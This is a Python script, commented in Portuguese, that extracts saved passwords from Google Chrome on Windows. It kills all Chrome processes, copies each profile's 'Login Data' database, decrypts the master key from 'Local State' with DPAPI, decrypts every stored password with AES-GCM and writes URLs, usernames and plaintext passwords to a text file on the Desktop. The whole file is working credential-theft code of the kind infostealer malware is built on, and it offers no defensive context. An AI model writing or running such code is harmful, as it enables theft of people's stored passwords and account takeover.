import sqlite3
import base64
import json
import os
import time
import shutil
from Crypto.Cipher import AES
import win32crypt
import psutil
import ctypes

# Detecta a pasta "Desktop" no sistema
def get_desktop_path():
    csidl_desktop = 0x0010
    buf = ctypes.create_unicode_buffer(260)
    ctypes.windll.shell32.SHGetFolderPathW(0, csidl_desktop, 0, 0, buf)
    return buf.value

OUTPUT_FILE_PATH = os.path.join(get_desktop_path(), "ChromePasswords.txt")
TEMP_DB_FILE = "temp_ChromePasswords.db"

def get_key(keypath):
    """Obtém a chave de criptografia do arquivo 'Local State' do Chrome."""
    try:
        with open(keypath, "r", encoding="utf-8") as f:
            local_state_data = json.load(f)
        encryption_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
    except Exception as e:
        error_message = f"Erro ao obter a chave: {e}\n"
        print(error_message)  # Exibe o erro na saída padrão
        return None

def temp_store(mode, data=None):
    """Armazena dados temporariamente em um arquivo txt no Desktop."""
    try:
        if mode == "write":
            with open(OUTPUT_FILE_PATH, "a") as f:
                f.write(data)
        elif mode == "read":
            if os.path.exists(OUTPUT_FILE_PATH):
                with open(OUTPUT_FILE_PATH, "r") as f:
                    return f.readlines()
            return []
    except Exception as e:
        print(f"Erro ao acessar ou criar o arquivo: {e}")

def password_decryption(password, encryption_key):
    """Descriptografa a senha usando a chave fornecida."""
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except Exception as e:
        error_message = f"Erro na descriptografia: {e}\n"
        print(error_message)  # Exibe o erro na saída padrão
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except Exception as e:
            error_message = f"Erro na descriptografia alternativa: {e}\n"
            print(error_message)  # Exibe o erro na saída padrão
            return "Sem senhas"

def close_chrome():
    """Força o fechamento de todos os processos do Chrome."""
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == 'chrome.exe':
            proc.kill()

def remove_temp_file():
    """Remove o arquivo temporário com várias tentativas se necessário."""
    attempts = 0
    while attempts < 5:
        try:
            if os.path.exists(TEMP_DB_FILE):
                os.remove(TEMP_DB_FILE)
            break
        except Exception as e:
            error_message = f"Erro ao remover arquivo temporário na tentativa {attempts+1}: {e}\n"
            print(error_message)  # Exibe o erro na saída padrão
            attempts += 1
            time.sleep(2)

def get_credt(dbpath, keypath):
    """Extrai credenciais do banco de dados e escreve em um arquivo txt."""
    credentials_found = False
    try:
        close_chrome()
        time.sleep(5)
        
        if os.path.exists(TEMP_DB_FILE):
            os.remove(TEMP_DB_FILE)
        shutil.copyfile(dbpath, TEMP_DB_FILE)
        time.sleep(5)
        
        with sqlite3.connect(TEMP_DB_FILE) as db:
            cursor = db.cursor()
            cursor.execute("PRAGMA busy_timeout = 5000;")
            cursor.execute(
                "SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_last_used"
            )
            for row in cursor.fetchall():
                main_url, login_page_url, user_name, password, date_created, last_used = row
                decrypted_password = password_decryption(password, get_key(keypath))
                if user_name or decrypted_password:
                    credentials_found = True
                    info = (f"URL Principal: {main_url}, URL de Login: {login_page_url}, "
                            f"Nome de usuário: {user_name}, Senha descriptografada: {decrypted_password}\n")
                    temp_store("write", info)
            cursor.close()
        db.close()
    except sqlite3.OperationalError as e:
        error_message = f"Erro operacional do SQLite: {e}\n"
        print(error_message)  # Exibe o erro na saída padrão
    except Exception as e:
        error_message = f"Erro inesperado: {e}\n"
        print(error_message)  # Exibe o erro na saída padrão
    finally:
        remove_temp_file()
        if not credentials_found:
            # Cria o arquivo txt com uma mensagem indicando que nenhum dado foi encontrado
            temp_store("write", "Nenhuma senha ou login encontrado.\n")

def process_profiles():
    """Processa todos os perfis do Chrome para extrair credenciais."""
    root_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
    profiles = [i for i in os.listdir(root_path) if i.startswith("Profile")]
    
    credentials_info = []
    
    for profile in profiles:
        print(f"Processando dados do {profile}")
        db_path = os.path.join(root_path, profile, "Login Data")
        key_path = os.path.join(root_path, "Local State")
        get_credt(db_path, key_path)
        print(f"Sucesso para o {profile}")
        
        if os.path.exists(OUTPUT_FILE_PATH):
            with open(OUTPUT_FILE_PATH, "r") as f:
                credentials_info.append(f.read())
    
    if credentials_info:
        with open(OUTPUT_FILE_PATH, "w") as f:
            f.write("\n".join(credentials_info))
        print(f"Extração de dados concluída. Verifique o arquivo na sua Área de Trabalho.")
    else:
        print(f"Arquivo não criado. Verifique por erros.")

try:
    process_profiles()
except Exception as e:
    error_message = f"Erro encontrado durante o processamento: {e}\n"
    print(error_message)  # Exibe o erro na saída padrão
    print("Erro encontrado!")
    print(str(e))
